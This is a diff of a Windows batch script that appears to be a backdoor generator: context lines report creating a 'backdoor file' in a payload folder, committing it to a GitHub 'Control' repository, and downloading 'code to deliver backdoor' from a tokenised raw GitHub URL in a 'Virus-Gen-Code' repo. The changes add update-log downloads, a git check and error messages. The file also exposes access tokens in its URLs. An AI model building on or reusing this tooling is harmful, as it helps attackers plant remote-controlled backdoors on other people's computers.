@@ -2,11 +2,18 @@
 set update_number=V1.22.14
 @echo off && color 0F && title unstable Release %update_number% && set temp=0
 cls
-goto dev
 goto check_Permissions
-if not exist C:\ProgramData\update.sav (goto UPcreate) else (goto UPcheck)
-git 
-:adminyes 
+:adminyes
+if exist C:\ProgramData\UPnum.sav (goto UPcheck) else (goto UPcreate)
+:UPnxt
+git version >git.sav
+>nul find "version" git.sav && (
+  goto GIT_check_nxt
+) || (
+  goto error1
+)
+:GIT_check_nxt
+del git.sav
 :: detect and load save file data
 if exist C:\ProgramData\GVGemail.sav (goto load_email) else (goto error2)
 :emailnext
@@ -28,7 +35,7 @@ git config user.email "%email%"
 git reset --hard origin/main
 git init -b main
 git pull https://github.com/Guest257351/Control.git --allow-unrelated-histories 
-git add %opt1%.bat
+git add "%opt1%.bat"
 git commit -m "%opt2%"
 git remote add origin https://github.com/Guest257351/Control.git
 git remote -v
@@ -62,7 +69,7 @@ if exist %opt2%\payload\payload.bat (echo [92msuccessfully created backdoor fil
 timeout 1 /NOBREAK >nul
 :: generate a file to move files to their proper location
 echo [33mdownloading code to deliver backdoor...[0m
-set dlerror=6
+set dlerror=7
 Set "url=https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/RC?token=ANX5WBHRRO5XGZLFD4PQSVLAKLC2Q"
 for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
 Call :Download "%url%" "%File%"
@@ -105,7 +112,7 @@ echo [31merror: failed to detect git installation[0m
 echo [31merror type: fatal[0m
 echo [31mhow to replicate: uninstall git[0m
 echo [31mhow to fix: Program will take you to the git installation website, after installing relaunch the program[0m
-echo [31mextra information: this error could be cause because you did not install git to the default directory, I am creating a method to detect it in all directories[0m
+echo [31mextra information: if you have git portable a system to allow that will be implemented soon[0m
 echo.
 echo press any key to be taken to the git website...
 pause >nul
@@ -153,7 +160,7 @@ echo [31merror: email save failed[0m
 echo [31merror type: fatal[0m
 echo [31mhow to replicate: unknown.[0m
 echo [31mhow to fix: there is no known fix for this error[0m
-echo [31mextra information: if you would like to help me fix this bug please contact me through discord: guest257351#1040[0m
+echo [31mextra information: if you would like to help me fix this bug please contact me through discord: "guest257351#1040" I have no idea why this bug is caused, it is most likely caused because you do not have permission to edit C:\ProgramData[0m
 echo.
 echo press any key to exit...
 pause >nul
@@ -171,7 +178,7 @@ echo.
 echo press any key to exit...
 pause >nul
 exit /b
-:error6
+:error7
 git rm %opt1%.bat
 del %opt2%\payload
 echo [31merror code: 07[0m
@@ -179,6 +186,17 @@ echo [31merror: run file creation failed[0m
 echo [31merror type: fatal[0m
 echo [31mhow to replicate: unknown[0m
 echo [31mhow to fix: there is no known fix for this error[0m
+echo [31mextra information: if you would like to help me fix this bug please contact me through discord: guest257351#1040[0m
+echo.
+echo press any key to exit...
+pause >nul
+exit /b
+:error8
+echo [31merror code: 08[0m
+echo [31merror: failed to get update logs[0m
+echo [31merror type: fatal[0m
+echo [31mhow to replicate: unknown[0m
+echo [31mhow to fix: error is most likely caused by lack of internet connection. Please make sure you are connected and github.com is not blocked on your wifi.[0m
 echo [31mextra information: if you would like to help me fix this bug please contact me through discord: guest257351#1040[0m
 echo.
 echo press any key to exit...
@@ -224,3 +242,27 @@ echo.
 echo press any key to exit...
 pause >nul
 exit
+:UPcreate
+echo %update_number% >C:\ProgramData\UPnum.sav
+goto UPlogs
+:UPcheck
+< C:\ProgramData\UPnum.sav (
+  set /p UPnum=
+)
+if %UPnum% equ %update_number% goto UPnxt
+:UPlogs
+echo %update_number% >C:\ProgramData\UPnum.sav
+set dlerror=8
+Set "url=https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/Current-update-logs?token=ANX5WBGASWKLFWIFRWBPGF3AKRJA4"
+for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
+Call :Download "%url%" "%File%"
+If exist "%File%" ( 
+    ( Type "%File%")>con
+( Type "%File%" >C:\ProgramData\UPlogs.txt)
+)
+cls
+echo.
+echo please close the text document to continue
+start /WAIT C:\ProgramData\UPlogs.txt
+cls
+goto UPnxt
